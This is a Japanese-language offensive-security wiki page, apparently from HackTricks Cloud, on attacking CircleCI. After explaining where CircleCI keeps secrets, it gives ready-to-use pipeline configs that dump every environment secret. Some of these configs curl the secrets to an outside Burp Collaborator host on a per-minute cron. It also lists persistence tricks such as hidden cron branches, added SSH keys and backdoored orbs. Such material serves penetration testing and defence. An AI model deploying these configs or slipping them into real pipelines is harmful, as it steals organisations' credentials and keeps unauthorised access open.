# CircleCIセキュリティ

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## 基本情報

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/)は、コードに対して何を行い、いつ行うかを示す**テンプレートを定義**することができる**継続的インテグレーションプラットフォーム**です。これにより、テストやデプロイを**リポジトリのマスターブランチから直接自動化**することができます。

## 権限

**CircleCI**は、ログインする**アカウント**に関連するgithubとbitbucketの**権限を継承**します。\
私のテストでは、githubのリポジトリに対して**書き込み権限**がある限り、**CircleCIのプロジェクト設定を管理**することができます（新しいsshキーの設定、プロジェクトAPIキーの取得、新しいCircleCI設定を持つ新しいブランチの作成など）。

ただし、**リポジトリの管理者**である必要があります。

## 環境変数とシークレット

[**ドキュメント**](https://circleci.com/docs/2.0/env-vars/)によると、ワークフロー内の**環境変数に値をロード**するためのさまざまな方法があります。

### 組み込みの環境変数

CircleCIによって実行されるすべてのコンテナには、常に[**ドキュメントで定義された特定の環境変数**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)があります。例えば、`CIRCLE_PR_USERNAME`、`CIRCLE_PROJECT_REPONAME`、`CIRCLE_USERNAME`などです。

### 平文

**コマンド**内で平文で宣言することができます：
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**実行環境**内で明示的に宣言することができます。
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**ビルドジョブの環境**内で、それらをクリアテキストで宣言することができます。
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
コンテナの**環境**内で明示的に宣言することができます。
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### プロジェクトの秘密情報

これらは、**プロジェクト**（**どのブランチ**でも）によってのみ**アクセス可能**な**秘密情報**です。\
これらは_https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ で**宣言されている**のを見ることができます。

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
「**変数のインポート**」機能を使用すると、他のプロジェクトからこのプロジェクトに変数を**インポート**することができます。
{% endhint %}

### コンテキストの秘密情報

これらは**組織全体の秘密情報**です。**デフォルトでは、どのリポジトリ**でもここに保存された**秘密情報にアクセス**できます。

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
ただし、異なるグループ（All membersの代わりに）を**選択して、特定の人にのみ秘密情報へのアクセスを許可**することもできます。\
これは現在、秘密情報のセキュリティを**向上させる最善の方法の一つ**であり、誰でもアクセスできるのではなく、一部の人にのみアクセスを許可するためです。
{% endhint %}

## 攻撃手法

### 平文の秘密情報の検索

VCS（githubなど）に**アクセス権**がある場合は、各リポジトリの各ブランチの`.circleci/config.yml`ファイルを**チェック**し、そこに保存されている潜在的な**平文の秘密情報**を検索します。

### Secret Env Vars & Contextの列挙

コードをチェックすると、各`.circleci/config.yml`ファイルで使用されている**すべての秘密情報の名前**を見つけることができます。また、これらのファイルから**コンテキストの名前**を取得するか、ウェブコンソールで確認することもできます：_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_。

### プロジェクトの秘密情報の外部流出

{% hint style="warning" %}
プロジェクトとコンテキストの**すべての秘密情報を外部に流出**するには、github組織全体で**1つのリポジトリにだけ書き込みアクセス**が必要です（_アカウントがコンテキストにアクセスできるようになっている必要がありますが、デフォルトでは誰でもすべてのコンテキストにアクセスできます_）。
{% endhint %}

{% hint style="danger" %}
「**変数のインポート**」機能を使用すると、他のプロジェクトからこのプロジェクトに変数を**インポート**することができます。したがって、攻撃者は**すべてのリポジトリからプロジェクトの変数をインポート**し、それらを**一緒に外部に流出**させることができます。
{% endhint %}

すべてのプロジェクトの秘密情報は常にジョブの環境に設定されているため、envを呼び出してbase64で書き換えるだけで、秘密情報が**ワークフローのウェブログコンソール**に外部流出します。
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
もし**ウェブコンソールにアクセスできない**が、**リポジトリにアクセスでき**、CircleCIが使用されていることを知っている場合、単に**毎分トリガーされるワークフロー**を**作成**し、そのワークフローで**シークレットを外部のアドレスに送信**することができます。
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### コンテキストのシークレットを外部に持ち出す

**コンテキスト名を指定する必要があります**（これによりプロジェクトのシークレットも外部に持ち出されます）:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
もし**ウェブコンソールにアクセスできない**が、**リポジトリにアクセスでき**、CircleCIが使用されていることを知っている場合、単に**1分ごとにトリガーされるワークフローを変更**して、シークレットを外部のアドレスに**漏洩させる**ことができます。
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
新しい `.circleci/config.yml` をリポジトリに作成するだけでは、circleciのビルドをトリガーすることはできません。**circleciコンソールでプロジェクトを有効にする必要があります**。
{% endhint %}

### クラウドへの逃走

**CircleCI** では、**ビルドを彼らのマシンまたは自分自身のマシンで実行するオプション**があります。\
デフォルトでは、彼らのマシンはGCPにあり、最初は関連する情報を見つけることはできません。ただし、被害者が**自分自身のマシン（おそらくクラウド環境内）でタスクを実行している場合**、興味深い情報が含まれている**クラウドメタデータエンドポイント**を見つけることができるかもしれません。

前の例では、すべてのものがDockerコンテナ内で起動されましたが、**VMマシンを起動するように依頼することもできます**（異なるクラウドの権限を持つ場合があります）。
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
または、リモートのDockerサービスにアクセスできるDockerコンテナーでさえも:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### 持続性

* CircleCIで**ユーザートークンを作成**して、ユーザーアクセスでAPIエンドポイントにアクセスすることが可能です。
* _https://app.circleci.com/settings/user/tokens_
* プロジェクトにアクセスするための**プロジェクトトークンを作成**することが可能です。トークンに与えられた権限でプロジェクトにアクセスできます。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* プロジェクトに**SSHキーを追加**することが可能です。
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* 予期しないプロジェクトの隠しブランチに**cronジョブを作成**することが可能で、毎日すべての**コンテキスト環境変数を漏洩**させることができます。
* または既知のジョブをブランチに作成/変更して、毎日すべてのコンテキストとプロジェクトの**シークレットを漏洩**させることも可能です。
* GitHubの所有者であれば、**未検証のオーブを許可**し、ジョブでバックドアとして構成することができます。
* あるタスクで**コマンドインジェクションの脆弱性**を見つけ、その値を変更することで、**シークレットを注入**することができます。

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで宣伝したい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしましょう🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングのトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
